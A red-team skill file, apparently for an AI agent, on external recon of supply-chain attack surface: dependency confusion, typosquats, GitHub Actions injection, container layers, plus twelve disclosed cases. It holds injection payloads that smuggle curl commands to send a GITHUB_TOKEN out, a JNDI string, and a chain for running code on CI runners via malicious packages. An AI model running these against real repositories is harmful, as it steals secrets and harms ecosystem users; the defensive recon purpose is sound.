name: supply-chain-attack-recon
description: External recon for software supply-chain attack surface — package-namespace squatting candidates, dependency-confusion vulnerabilities, GitHub Actions injection openings, container image registry exposure, SBOM mining, internal-package-name leakage, and CI/CD configuration exposure. Reconnaissance and identification ONLY — actual package publishing / typosquat attacks are EXTERNAL-OFFENSIVE and require explicit written sign-off because they can affect the entire npm/PyPI ecosystem. Use when the target has a public GitHub org, when their build artifacts/SBOMs are reachable, when their docker images are on Docker Hub/GHCR, or when you find internal package names in their JS bundles.

## When to use

Trigger when:
- Target has a public GitHub organization (find via OSINT)
- JS bundles reference internal-looking package names (`@target-internal/...`, `target-utils`, `target-shared`)
- Build logs, SBOMs, or `package-lock.json` files are publicly accessible
- Target uses CI/CD that's partially public (GitHub Actions, GitLab CI, Bitrise)
- Docker images on Docker Hub/GHCR/Quay belong to target org
- Findings include `npmrc`/`pip.conf`/`gradle.properties` with internal registry URLs
- `.github/workflows/*.yml` files reference internal tooling

Do NOT use for:
- Internal-network artifact registries (out of scope per external boundary)
- Actually publishing typosquats / dep-confusion packages without explicit OK
- Compromising upstream open-source projects (massive blast radius — illegal in most jurisdictions without authorization)

---

## The supply-chain attack surface map

```
Target Org
├── Public GitHub Org → workflow files → secrets exfil opportunities
├── Internal package names in JS/Android bundles → dependency confusion
├── Docker images on public registries → secrets in layers, RCE on pull
├── SBOM / artifact metadata → exact dep versions for known-vuln chaining
├── npmrc / pip.conf in repos → internal registry URL disclosure
├── External package dependencies → typosquat name candidates
└── Build/release pipelines → injection if pull_request_target etc.
```

---

## Step 1 — GitHub org discovery

```bash
TARGET="<brand>"  # set to target brand name

# Direct guesses
for guess in $TARGET "${TARGET}-tech" "${TARGET}corp" "${TARGET}-io" "${TARGET}-eng"; do
  curl -sI "<target>" | grep -E "HTTP|status" | head -1
done

# Via WHOIS / email-domain → GitHub search
gh search users --owner-affiliations=organization --query "$TARGET" --limit 10

# Via employees → reverse from social media + GitHub profile
# Many employees list their employer org on their GitHub profile
```

---

## Step 2 — Enumerate public repos for sensitive artifacts

```bash
ORG="targetorg"

# List public repos
gh repo list "$ORG" --limit 100 --json name,description,visibility,defaultBranchRef

# Look for high-signal repo names
gh repo list "$ORG" --limit 100 --json name | jq -r '.[].name' | grep -iE "internal|infra|deploy|config|secret|setup|sdk|api"

# Clone all (small org) or selectively
gh repo clone "$ORG/$repo_name"
```

---

## Step 3 — Internal package-name discovery

### From JS bundles

```bash
# JS bundles are the easiest source of internal npm names
curl -sk <target> | grep -oE '@[a-z-]+/[a-z-]+' | sort -u
curl -sk <target> | grep -oE 'require\("[^"]+"\)' | sort -u

# Look for scoped names that are NOT public on npm
for pkg in @target/utils @target-internal/api @companybrand/sdk; do
  status=$(curl -sI "<target>" | head -1 | awk '{print $2}')
  echo "  $pkg → $status"
  # 404 → name unclaimed on public npm → DEPENDENCY-CONFUSION CANDIDATE
done
```

### From GitHub repo package.json files

```bash
# Public repos with package.json that reference internal scopes
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  pkg=$(gh api "repos/$ORG/$repo/contents/package.json" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
  echo "$pkg" | jq -r '.dependencies // {} | keys[]' 2>/dev/null | grep -E '^@[a-z-]+/'
done | sort -u
```

### From Python projects

```bash
# Internal pip package names
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  gh api "repos/$ORG/$repo/contents/requirements.txt" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null
done | sort -u | grep -vE '^(requests|django|flask|numpy|pandas|...common)'
```

---

## Step 4 — Dependency-confusion vulnerability check

For each internal-looking package name discovered:

```bash
NAME="@target-internal/utils"   # example

# npm check
curl -sI "<target>" | head -1
# 404 → name is registerable → DEPENDENCY-CONFUSION POSSIBLE

# pypi check (no scopes, just name)
NAME="target_utils"
curl -sI "<target>" | head -1
# 404 → name is registerable

# rubygems
curl -sI "<target>" | head -1

# Go modules — slightly different, since module names are URLs
# Check if module path is reachable
curl -sI "<target>" | head -1
```

**Severity calibration:** Just because a name is unclaimed doesn't mean it's exploitable. You also need:
1. Evidence the target's BUILD SYSTEM resolves names from public registries (not just their internal one)
2. OR evidence the target's package manager is configured insecurely (e.g., `.npmrc` without `@scope:registry=` mapping)
3. OR the package would be installed by their builds (it's actually in package.json, not just referenced in dead code)

A 404 on registry without supporting context is INFORMATIONAL only.

---

## Step 5 — Typosquat candidates (around external dependencies)

For each external public dependency the target uses:

```bash
# Common typosquat patterns:
# Original: "react-router-dom"
# Typos: 
#   "react-router-doms" (extra s)
#   "react-routter-dom" (double t)
#   "react-rotuer-dom" (transposed)
#   "react--router-dom" (double dash)
#   "react-router-dorn" (m→rn)
#   "reactrouterdom" (no dashes)

# Generate candidates
python3 -c "
import sys
name='react-router-dom'
for i in range(len(name)):
    print(name[:i] + name[i+1:])   # delete
    if i < len(name)-1:
        print(name[:i] + name[i+1] + name[i] + name[i+2:])  # transpose
"

# Check which candidates are UNCLAIMED on the registry
for candidate in ...; do
  status=$(curl -sI "<target>" | head -1 | awk '{print $2}')
  [ "$status" = "404" ] && echo "  UNCLAIMED: $candidate"
done
```

**⚠ EXTERNAL-OFFENSIVE NOTE:** publishing a typosquat package to a public registry is an attack on the wider ecosystem. NEVER do this without explicit, written, scope-clarified sign-off. It can affect users outside your engagement and may be illegal.

---

## Step 6 — GitHub Actions workflow injection scan

For each public repo with `.github/workflows/`:

```bash
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  workflows=$(gh api "repos/$ORG/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null)
  for wf in $workflows; do
    content=$(gh api "repos/$ORG/$repo/contents/.github/workflows/$wf" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
    echo "=== $repo/$wf ==="
    
    # High-risk patterns:
    # 1. pull_request_target (runs with secrets on PR from forks)
    echo "$content" | grep -E 'pull_request_target'
    
    # 2. Untrusted context interpolation
    echo "$content" | grep -E '\$\{\{[^}]*github\.(event|head_ref|pull_request)[^}]*\}\}'
    
    # 3. ${{ github.event.* }} into shell run blocks
    echo "$content" | grep -B1 -A2 'run:' | grep -E '\$\{\{ ?github\.event\.'
    
    # 4. checkout of PR head with elevated perms
    echo "$content" | grep -E 'ref:.*pull_request|head_ref'
    
    # 5. Self-hosted runner without isolation
    echo "$content" | grep -E 'runs-on:.*self-hosted'

    # 6. Unpinned third-party actions — mutable tag (@v1, @main) vs pinned (@<40-char sha>)
    #    Mutable tags can be repointed by a compromised action repo (see case #9, tj-actions/changed-files).
    echo "$content" | grep -E 'uses: *[^ ]+/[^ ]+@(v?[0-9]+([.][0-9]+)*|main|master|latest)\b' | grep -v '@[0-9a-f]\{40\}'
  done
done
```

### Injection patterns to flag (severity guide)

| Pattern | Severity |
|---|---|
| `pull_request_target` + `actions/checkout` with `ref: pull_request.head.sha` + uses repo secrets | **Critical** — RCE on runner with org secrets |
| `${{ github.event.pull_request.title }}` interpolated into shell | **Critical** — script injection via PR title |
| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9) |
| Self-hosted runner reachable from public repo workflows | **High** — persistent attacker pivot |
| Issue-comment-triggered workflow that runs `gh` with token | **High** |
| Workflow downloads from URL that target controls | **Medium** |

### GitHub Actions context injection sinks (branch name, PR title, issue body)

Untrusted context flowing from PR metadata into `run:` blocks is a classic injection vector. Test payloads:

```bash
# Malicious branch name (test in a fork PR):
git checkout -b 'feat/x"; curl <target> | base64);"'
git push origin 'feat/x"; curl <target> | base64);"'

# Malicious PR title (create a test PR with this title):
PR_TITLE='x"; curl <target> $GITHUB_TOKEN | base64);"'

# Malicious issue body:
ISSUE_BODY='x"; curl <target> config user.name);"'

# Then watch workflow logs. If the injected commands execute, secrets are exfil'd.
```

### Public GitHub Actions run logs (leaks secrets)

Actions logs are public by default on public repos. Look for:

```bash
# List all Action runs for a repo
gh api repos/OWNER/REPO/actions/runs --jq '.workflow_runs[] | {id, name, head_branch, status, conclusion}'

# Fetch logs from a run
gh api repos/OWNER/REPO/actions/runs/<id>/logs --jq '.logs' | base64 -d

# Search logs for common leakage patterns
gh api repos/OWNER/REPO/actions/runs/<id>/logs | grep -iE 'token|key|secret|password|credential|aws_'
```

Leaked secrets in logs = direct credential exfil; severity depends on the token type (GitHub PAT, npm token, AWS key, etc.).

### Static detection of Actions injection sinks with zizmor

For high-confidence automated flagging, run the `zizmor` analyzer on all workflow files:

```bash
# Install zizmor (Rust-based, from <target>)
cargo install zizmor

# Scan all workflows
zizmor .github/workflows/*.yml

# Output includes: pull_request_target, mutable-tag uses, context interpolation, etc.
# Sort findings by risk tier
```

Zizmor saves manual regex work and catches edge cases (e.g., indirect context interpolation via variable references).

---

## Step 7 — Docker / container image registry mining

```bash
# Docker Hub
curl -s "<target>" | jq -r '.results[].name'

# GHCR (GitHub Container Registry) — public images visible in repo packages tab
gh api "users/$ORG/packages?package_type=container" 2>/dev/null
gh api "orgs/$ORG/packages?package_type=container" 2>/dev/null

# For each image, list tags
for img in image1 image2; do
  curl -s "<target>" | jq -r '.results[].name'
done

# Pull and inspect layers
docker pull "$ORG/$img:latest"
docker history --no-trunc "$ORG/$img:latest"

# Mine layers for secrets
docker save "$ORG/$img:latest" -o /tmp/image.tar
mkdir -p /tmp/img && tar -xf /tmp/image.tar -C /tmp/img
find /tmp/img -name "*.tar*" -exec tar -xf {} -C /tmp/img/extracted \;
# Then run gitleaks / trufflehog over extracted filesystem
trufflehog filesystem /tmp/img/extracted --no-update
```

---

## Step 8 — SBOM / artifact metadata leakage

```bash
# Look for SBOMs published as releases (SPDX, CycloneDX format)
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("sbom|cyclonedx|spdx"; "i")) | .browser_download_url'

# JSON dependency lockfiles in releases
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("lock|deps"; "i")) | .browser_download_url'

# Exact-version-pinned deps → known-CVE chaining
# Compare versions to nuclei nvd templates or osv.dev for known vulns
curl -s "<target>" -d '{"package": {"name": "lodash", "ecosystem": "npm"}, "version": "4.17.10"}'
```

---

## Step 9 — Internal registry URL leakage

```bash
# .npmrc patterns
grep -r "registry=" .                                            # in cloned repos
grep -r "_authToken=" .                                          # leaked npm token!
grep -r "@.*registry=" .                                          # scoped registry

# pip config
grep -r "extra-index-url" .
grep -r "index-url" .

# Gradle / Maven
grep -rE "(mavenCentral|maven\s*\{)" .
grep -r "url.*\(.*nexus" .

# Each leaked internal URL is intel — flag the URL itself even if not directly exploitable
```

---

## Step 10 — npm/PyPI organizational presence

```bash
# Some orgs maintain a public npm scope mirroring their brand
curl -s "<target>" | jq '.objects[].package.name'

# Public PyPI presence
curl -s "<target>" | grep "$ORG" | head -20

# Check if scope is taken — if it's NOT, an attacker could register
# (relevant for any internal package using that scope)
curl -sI "<target>"
```

---

## Step 11 — Frontend and third-party dependency checks

### Compromised CDN detection (polyfill.io, etc.)

Known-compromised CDNs and analytics services have been weaponized. Check target's public HTML/JS:

```bash
# Detect usage of polyfill.io and similar historically-compromised services
curl -s <target> | grep -i polyfill
curl -s <target> | grep -iE '(polyfill\.io|cdn\.jsdelivr\.net.*polyfill|babel\.min\.js)'

# Check JavaScript bundles
for bundle in public/*.js main.*.js app.*.js; do
  grep -i polyfill "$bundle" && echo "FOUND: $bundle"
done
```

Reference: polyfill.io was compromised in 2024 to serve malicious payloads. Presence = supply-chain risk.

## Tooling

| Tool | Purpose |
|---|---|
| **`trufflehog`** | Filesystem/git/docker secret scan |
| **`gitleaks`** | Git history secret scan |
| **`dependency-confusion`** (Confused) | npm scope/PyPI checks |
| **`packj`** | Package risk score (PyPI/npm/RubyGems) |
| **`Lift / Snyk vuln-db`** | Known CVE lookup by package version |
| **`actionlint`** | GitHub Actions static analyzer |
| **`zizmor`** | GitHub Actions injection & security antipattern detection |
| **`OSSGadget`** | Microsoft's package metadata toolkit |
| **`semgrep`** + supply-chain rules | Workflow injection detection |
| **`osv-scanner`** | Match versions to known vulns |

---

## Severity scoring guidance

| Finding | Severity |
|---|---|
| Internal package name + no scope-mapping + unclaimed on public npm + actively in builds | **Critical** — Dep-confusion RCE |
| Internal package name + scope-mapping in `.npmrc` but `_authToken` leaked | **Critical** — direct registry push |
| Pull_request_target workflow + secrets exposed + PR-controlled code execution | **Critical** — Org-wide token theft |
| Docker image with leaked secret in layer | **High** (varies by secret) |
| Internal registry URL disclosed (but no creds) | **Low** — Info-disc only |
| Typosquat candidate identified (not published) | **Informational** — Awareness item |
| Public org has 1000+ unused names that COULD be claimed | **Informational** — Hygiene |

---

## Anti-patterns

- **DO NOT publish a typosquat / dep-confusion package without explicit, signed, scope-clarified authorization** — this affects users outside the engagement
- **DO NOT submit PRs to client repos as part of testing without specific OK** — workflow injection PoCs may be needed but they touch CI/CD and other developers
- **DO NOT scrape entire npm/PyPI for typosquat candidates** — irresponsible and noisy
- **DO NOT confuse "name is unclaimed" with "exploitable dependency confusion"** — the build system matters; many orgs use proper scope-mapping that prevents the attack
- **DO NOT touch GitHub Actions self-hosted runners** — they may be inside the client network and outside the external scope
- **DO NOT pull large Docker images blindly** — image bandwidth can be 5-50GB; review tags first

---

## What constitutes a deliverable finding

A supply-chain finding needs ALL of:
1. **Concrete name/path** — exact internal package name, exact workflow file path, exact image tag
2. **Vulnerability mechanism** — dep-confusion / typosquat / injection / etc.
3. **Exploitability evidence** — proof the build/install would actually use the attacker's payload (not just "name is unclaimed")
4. **Severity** — calibrated to blast radius (one developer? all developers? all users of the package?)
5. **Recommendation** — specific (e.g., "register the unused name @target-internal/utils on npm AS YOUR OWN even if unused; configure `.npmrc` scope:registry mapping")

---

## Bridge to neighboring skills

- `apk-redteam-pipeline` — APKs reveal internal package names too (find them in decompiled `build.gradle`)
- `cloud-iam-deep` — CI/CD secrets often = cloud credentials; this skill finds them, that skill validates them
- `hunt-cloud-misconfig` — CI/CD pipeline misconfig (Jenkins / GitLab Runner) overlap
- `m365-entra-attack` — Azure DevOps pipelines are part of Entra surface
- `redteam-report-template` — supply-chain findings need extra clarity on blast radius (one repo vs whole ecosystem)
- `mid-engagement-ir-detection` — registering a name on public npm triggers nothing inside the client, but ANY publish action is loud and audit-trailed

---

## External-only boundary check

This skill is squarely external — all targets are public registries / public GitHub. If the engagement involves the client's internal artifact registry (internal Nexus, JFrog, Sonatype), that is internal infrastructure and OUT OF SCOPE per `feedback_skill_boundaries`. Report internal-registry URL exposure as a finding; do not attempt to enumerate it.

## Disclosed-case catalogue (citations)

Twelve well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.

### 1. SolarWinds Orion / SUNBURST (CISA AA20-352A, Dec 2020)

- **Flow:** APT29 (UNC2452 / Cozy Bear) breached SolarWinds' build pipeline and inserted the SUNBURST backdoor into `SolarWinds.Orion.Core.BusinessLayer.dll`. The trojanized DLL was code-signed with SolarWinds' legitimate certificate and shipped to ~18,000 customers via the normal auto-update channel between March and June 2020.
- **Root cause:** Build-environment compromise — attackers modified source mid-compilation; signing infrastructure trusted the build output without verifying source integrity.
- **Impact:** ~18,000 organisations received the backdoor; ~100 (incl. US Treasury, Commerce, DHS, DoJ, Microsoft, FireEye/Mandiant) received the SECOND-stage TEARDROP/BEACON payload. SolarWinds reported >$40M in direct response costs; class-action settlement $26M.
- **References:**
  - CISA AA20-352A: <target>
  - Mandiant write-up (SUNBURST): <target>
  - Microsoft analysis: <target>
  - SolarWinds post-mortem: <target>
- **Recon takeaway:** Whenever a target ships signed binaries from their own CI, the recon check is: is the build environment itself reachable? Look for exposed Jenkins/GitLab CI consoles, public TeamCity agents, or build artefacts that leak source paths. A code-signing cert plus a compromised build = unstoppable trust chain.

### 2. 3CX VoIP softphone supply chain (CVE-2023-29059, March 2023)

- **Flow:** DPRK-attributed Lazarus subgroup (UNC4736 / Labyrinth Chollima) trojanized the 3CX DesktopApp (Electron-based softphone) on both Windows and macOS. Initial entry was via a PREVIOUS supply-chain attack — an employee installed a backdoored copy of Trading Technologies' X_TRADER, the FIRST disclosed cascading supply-chain compromise (one supply-chain victim becomes another's vector).
- **Root cause:** Dev workstation compromise → access to 3CX source/build pipeline → malicious `ffmpeg.dll` and `d3dcompiler_47.dll` shipped in signed installer.
- **Impact:** ~600,000 organisations use 3CX; tens of thousands of trojanized clients downloaded. Lazarus selectively activated second-stage payloads against cryptocurrency and trading firms.
- **References:**
  - CrowdStrike: <target>
  - SentinelOne: <target>
  - Mandiant cascading attack analysis: <target>
  - 3CX post-mortem: <target>
- **Recon takeaway:** Cascading supply chain is real — your target's vendors' vendors matter. When recon enumerates "what software does this org install on engineer laptops," each one is itself a supply-chain target. Electron apps (signed JS bundles) are especially common vectors.

### 3. MOVEit Transfer mass exploitation (CVE-2023-34362, May–July 2023)

- **Flow:** Cl0p ransomware affiliate (FIN11 / Lace Tempest) discovered an unauthenticated SQLi in Progress MOVEit Transfer, deployed the LEMURLOOT webshell, and exfiltrated files from every internet-reachable instance over a ~2-week window before the patch dropped on 31 May 2023.
- **Root cause:** Pre-auth SQLi in `moveitisapi/moveitisapi.dll` → arbitrary SQL → write webshell via `xp_cmdshell`-equivalent path. Classic single-CVE-mass-exploitation; not a build-pipeline attack but a SHIPPED-CODE supply-chain failure.
- **Impact:** ~2,700 organisations confirmed compromised, ~95 million individuals' PII leaked (BBC, Shell, BA, US DoE, Louisiana OMV, Oregon DMV, etc.). Estimated losses >$15B aggregated.
- **References:**
  - CISA AA23-158A: <target>
  - Progress advisory: <target>
  - Mandiant: <target>
  - Huntress technical breakdown: <target>
- **Recon takeaway:** Vendor file-transfer products (MOVEit, Accellion FTA, GoAnywhere MFT, Cleo Harmony) are the recurring "internet edge, holds everyone's data, runs on Windows" pattern. Always fingerprint by HTML title / favicon hash early in recon; a single edge-product CVE = entire customer base.

### 4. Codecov bash uploader compromise (Apr 2021)

- **Flow:** Attackers gained access to Codecov's Docker image build process via a credential mistake in the image-creation flow, then modified the `Bash Uploader` script (`<target>) to exfiltrate environment variables to a third-party IP. The modification persisted from 31 Jan 2021 to 1 Apr 2021 — two months before detection by a customer who noticed an SHA-256 mismatch.
- **Root cause:** Docker image build leaked a credential allowing modification of the served bash script; no integrity verification (no signed pinned hash) on the customer side.
- **Impact:** Every CI run worldwide that piped `curl -s <target> | bash` for 2 months exfiltrated env vars. Confirmed downstream victims: HashiCorp (rotated GPG key), Twilio, Rapid7 (source-code partial exposure), Mercari, Confluent, Atlassian.
- **References:**
  - Codecov post-mortem: <target>
  - HashiCorp advisory: <target>
  - Mercari disclosure: <target>
  - Rapid7: <target>
- **Recon takeaway:** "Curl-bash-install" patterns in public CI workflows are gold for this recon skill — search `.github/workflows/` for `curl ... | bash`, `wget ... | sh`, `iwr ... | iex`. Any third-party URL fed into a shell is a supply-chain blast radius. Pinned SHAs in workflows mitigate; absence of pinning = finding.

### 5. ua-parser-js npm hijack (Oct 2021)

- **Flow:** Attacker phished/credential-stuffed the maintainer's npm account and published `0.7.29`, `0.8.0`, and `1.0.0` of `ua-parser-js` (≈7M weekly downloads, transitively reaching Facebook, Microsoft, Amazon, IBM). The malicious versions ran a `preinstall` hook that downloaded a cryptominer + Windows password-stealer (Jason credential stealer).
- **Root cause:** Maintainer npm account had no 2FA / weak credentials; npm did not enforce 2FA for high-value publishers at the time.
- **Impact:** Packages live ~4 hours before takedown but tens of thousands of installs in that window. CISA issued an emergency alert — the first time CISA had ever warned on an npm-package compromise.
- **References:**
  - GitHub Security advisory: <target>
  - CISA alert: <target>
  - Maintainer's incident note: <target>
  - Snyk analysis: <target>
- **Recon takeaway:** Identify your target's top-30 npm/PyPI maintainers by package download count, then check whether their accounts have 2FA enabled (npm exposes this via `npm profile get` on org members, partially public via the registry API). Recon output: "these 4 maintainers control packages with X installs and have no 2FA per public registry data."

### 6. event-stream npm package (Nov 2018)

- **Flow:** Original maintainer Dominic Tarr (no longer using the module) handed `event-stream` (≈2M weekly downloads) to a new contributor named "right9ctrl" who'd offered to maintain it. The new maintainer added `flatmap-stream` as a dependency, then pushed an update to `flatmap-stream` containing payload targeting the Copay bitcoin wallet's build — stole BTC/BCH wallet seeds from any Copay user.
- **Root cause:** Social engineering of a maintenance-handover; no review of new contributors taking over critical packages. The malicious dep was only triggered when `event-stream` was bundled into the Copay wallet (build-context targeting).
- **Impact:** Copay wallet users had keys stolen; exact dollar damage never disclosed publicly. Triggered the npm-wide 2FA push and "popular packages need additional review" policy.
- **References:**
  - GitHub Security advisory: <target>
  - npm post-mortem: <target>
  - Original disclosure thread: <target>
  - Snyk write-up: <target>
- **Recon takeaway:** Check `npm view <pkg> maintainers` and recent maintainer changes for packages your target depends on. A maintainer change in the past 90 days on a 100K+ download package is a yellow flag. Also: payload-targeting-by-build-context (only fires when bundled into specific app) is HARD to detect — static scanners miss it.

### 7. PHP Git server compromise (March 2021)

- **Flow:** Attackers pushed two malicious commits to the official `php-src` git repository on `git.php.net`, signed as Rasmus Lerdorf and Nikita Popov. The commits added a Zend backdoor that executed code from the `User-Agentt` HTTP header (note double-t).
- **Root cause:** Self-hosted git server (Gitolite-based `git.php.net`) had a credential / authentication flaw — possibly password-stored-in-plain in a user database leak. PHP team migrated to GitHub as canonical source after this incident.
- **Impact:** Backdoor commits caught within hours, never shipped in a release. But this is the canonical case of "self-hosted source-of-truth = single point of failure."
- **References:**
  - PHP.net post-mortem: <target>
  - Nikita Popov's analysis: <target>
  - ZDNet coverage: <target>
- **Recon takeaway:** Targets running self-hosted git (Gitea, Gitolite, Phabricator, Bitbucket Server) are higher-risk than GitHub-hosted. Recon should fingerprint git-server software, check for default creds, and watch for SSH-key-based pushes from unexpected IPs (visible in commit metadata).

### 8. Log4Shell (CVE-2021-44228, Dec 2021)

- **Flow:** Not a supply-chain ATTACK per se, but the canonical "you don't know what's in your dependency tree" event. A JNDI lookup feature in Apache Log4j 2.x allowed remote code execution via `${jndi:ldap://attacker/...}` in any logged string. Because Log4j is transitively pulled by thousands of Java apps, hundreds of millions of systems were vulnerable.
- **Root cause:** Unsafe-by-default feature shipped in 2013 (`MessageLookup` substitution); deeply nested transitive dependency made inventory and patching almost impossible.
- **Impact:** "Most critical vulnerability in a decade" per CISA Director Jen Easterly. Affected every major cloud, every Apache product, every Java enterprise stack. Ongoing mass exploitation by Conti, Khonsari ransomware, state actors.
- **References:**
  - CISA Log4j page: <target>
  - Apache advisory: <target>
  - LunaSec breakdown: <target>
  - GovCERT.ch tree of impacted products: <target> (KEV entry)
- **Recon takeaway:** SBOMs are the answer here. The recon skill's Step 8 (SBOM mining) earns its keep — pulling SPDX/CycloneDX from public release artefacts gives you exact transitive dependency versions, which you can then map to OSV / NVD for known CVEs. Most orgs underestimate their transitive depth.

### 9. tj-actions/changed-files GitHub Action compromise (CVE-2025-30066, March 2025)

- **Flow:** Attacker compromised the `tj-actions/changed-files` GitHub Action (used by ~23,000 repos) and modified all version tags v1–v45 to point to a malicious commit. The injected code ran `printenv` and dumped CI secrets to GitHub Actions logs — visible to anyone with read access on public repos.
- **Root cause:** Mutable tag references in GitHub Actions — `uses: tj-actions/changed-files@v35` resolves at run time, so an attacker who controls the repo can repoint old tags. Most consumers had not pinned to commit SHA (`@<sha>`).
- **Impact:** ~23,000 repositories impacted; CISA added to KEV; thousands of secrets (AWS keys, npm tokens, Docker Hub creds) leaked into public Action logs. Multiple downstream incidents (Coinbase, Cloudflare, others) traced back.
- **References:**
  - CISA KEV entry: <target>
  - StepSecurity disclosure: <target>
  - Wiz analysis: <target>
  - Semgrep: <target>
- **Recon takeaway:** This is the highest-yield current recon vector. Grep public repos for `uses: <org>/<repo>@v\d+` (mutable tag) versus `uses: <org>/<repo>@<sha>` (pinned). Any unpinned third-party action = supply-chain risk. The skill's Step 6 should explicitly flag mutable-tag usage.

### 10. PyPI typosquats (`colourama`, `python3-dateutil`, `jeIlyfish`, et al.)

- **Flow:** Attackers register PyPI packages with names visually/typographically similar to popular ones — `colourama` for `colorama`, `python3-dateutil` for `python-dateutil`, `jeIlyfish` (capital-I instead of L) for `jellyfish`. Each contained `setup.py` post-install hooks exfiltrating SSH keys, GPG keys, GitHub tokens, or installing crypto-stealers targeting `~/.bitcoin/wallet.dat`.
- **Root cause:** PyPI permits visually-confusable names; pip resolves names by exact string match. No human-review gate on new package publication.
- **Impact:** Each campaign typically <10K installs before takedown, but `jeIlyfish` lived 1 year (Dec 2018 → Dec 2019). Cumulative: dozens of campaigns documented annually by Snyk/Phylum/Sonatype/ReversingLabs.
- **References:**
  - ReversingLabs jeIlyfish/python3-dateutil: <target>
  - Snyk colourama / pytagora analysis: <target>
  - Phylum 2024 typosquat report: <target>
  - Sonatype 2024 State of the Software Supply Chain (>700K malicious packages found): <target>
- **Recon takeaway:** Step 5 of the skill (typosquat candidate generation) maps directly here. For external recon, you LIST candidate typosquat names — you NEVER publish unless explicitly authorized. The deliverable is "these 17 typosquat variants of your top deps are currently unclaimed; recommendation: register them defensively."

### 11. Alex Birsan dependency-confusion disclosure (Feb 2021)

- **Flow:** Birsan extracted internal npm scope names from leaked `package.json` files (publicly cached on archive.org, accidentally-public GitHub repos, JS bundles) for Apple, Microsoft, PayPal, Shopify, Uber, Tesla, Yelp, and ~35 others. He published packages on public npm/PyPI/RubyGems with those internal names AND a higher semver. Most companies' build systems then resolved the public package over the internal one and executed his telemetry-only payload.
- **Root cause:** Package managers (npm, pip, gem) default to "highest version wins, regardless of registry." Internal-package names leaked to external sources. No scope-to-registry enforcement.
- **Impact:** $130K+ in bug bounties (highest known SINGLE researcher payout across multiple programs in 2021); birthed the entire "dependency confusion" attack class; npm/PyPI/Microsoft Azure Artifacts all issued mitigations.
- **References:**
  - Original Birsan write-up: <target>
  - Microsoft white paper: <target>
  - GitHub post-mortem (npm side): <target>
  - Snyk research: <target>
- **Recon takeaway:** This is the founding citation for Step 3 + Step 4 of the skill. Internal scope discovery via JS bundles is the canonical recon path. Note Birsan's severity calibration: "name is unclaimed" alone was enough at most targets because their builds used `npm install` against a config that fell through to public npm — but the skill's severity table correctly notes this isn't universal.

### 12. XZ Utils (CVE-2024-3094, March 2024)

- **Flow:** "Jia Tan" (`JiaT75`) social-engineered the maintainer of `xz-utils` (an upstream OSS compression library used in nearly every Linux distro) over 2+ years. Once granted co-maintainer status, they inserted a multi-stage backdoor into `liblzma` build process — obfuscated as test fixtures — that would hijack SSH authentication via OpenSSH's systemd-notify integration.
- **Root cause:** Single-maintainer OSS burnout + nation-state-grade patience (Operation J / suspected APT). The backdoor was caught BEFORE major distros shipped it (only Fedora Rawhide and Debian unstable had it briefly) because Andres Freund noticed a 500ms SSH delay during a benchmark.
- **Impact:** Caught before mass deployment, near-miss event. Triggered industry-wide reassessment of "single-maintainer critical OSS" risk. CISA, NIST, OpenSSF all issued post-mortems.
- **References:**
  - CISA advisory: <target>
  - Andres Freund's original disclosure: <target>
  - Russ Cox timeline: <target>
  - Sam James technical breakdown: <target>
- **Recon takeaway:** Hardest case for external recon — social-engineering a maintainer over years leaves few external signals. But: GitHub commit-history analysis (new contributors gaining commit access on critical libs, commits adding obfuscated test fixtures, build-only-on-release changes) is what Andres Freund effectively did. The skill's Step 2 (enumerate public repos) can be extended to "watch for high-trust grants to low-history accounts."

| Step 10 — npm/PyPI org presence | ua-parser-js 2021, event-stream 2018 |

### Patterns across all 12 cases

- **Code-signing does NOT save you** — SolarWinds, 3CX, ua-parser-js all shipped legitimately-signed malicious code.
- **Pinning to mutable references is the recurring failure** — `curl | bash` (Codecov), `@v35` action tags (tj-actions), `^1.0.0` semver (Birsan, event-stream).
- **Maintainer-account compromise > technical CVE** for npm/PyPI ecosystem — 6 of 12 cases.
- **Cascading supply chain is now normal** — 3CX from X_TRADER; Codecov → HashiCorp → HashiCorp's downstream users. Assume your target's vendors' vendors are in scope conceptually.
- **CI runners are the highest-value foothold** — every case where attacker code executed on a CI runner yielded cloud / GitHub / secrets in bulk.

## Related Skills & Chains

- **`hunt-rce`** — Dependency confusion lands as RCE on whatever runner installs the package; CI runners are the highest-value target. Chain primitive: internal package name leaked in public JS bundle / SBOM / Docker image → publish malicious package to public npm/PyPI under same name with higher version → next `npm install` / `pip install` on CI runner executes attacker code in `preinstall` hook → `hunt-rce` post-foothold (env-var extraction yields AWS keys, GitHub PATs, Slack tokens) → CI-plane takeover.
- **`cloud-iam-deep`** — CI runners have IAM credentials; supply-chain RCE there is a credential-exfil bonanza. Chain primitive: malicious package executes on GitHub Actions runner → reads `$AWS_ACCESS_KEY_ID` / `$GITHUB_TOKEN` from env → `cloud-iam-deep` enumeration → IAM-privilege-escalation chain → production cloud-plane access.
- **`offensive-osint`** — Recon discipline overlaps heavily; SBOMs, JS bundles, GitHub org enumeration, Docker registry tags all live in both. Chain primitive: `offensive-osint` GitHub-org recon yields internal package names referenced in CI workflows → `supply-chain-attack-recon` cross-references these against public npm/PyPI for typosquat/confusion candidates.
- **`hunt-cloud-misconfig`** — Container registries (Docker Hub, GHCR, ECR public) frequently expose private images by accident. Chain primitive: SBOM mining reveals `internal-tools-v2:latest` referenced → check Docker Hub for accidentally-public mirror → `hunt-cloud-misconfig` registry enum → pull image → extract secrets baked into layers.
- **`triage-validation`** + **`redteam-report-template`** — Supply-chain RECON is in scope; actual publishing is EXTERNAL-OFFENSIVE and needs explicit written sign-off. Chain primitive: recon-only candidate list assembled → run through `triage-validation` 7-Question Gate (specifically: "can I demonstrate impact WITHOUT publishing?") → report as "dependency-confusion candidate inventory + reproduction steps" via `redteam-report-template`, never as a published-package PoC unless client signed off in writing.
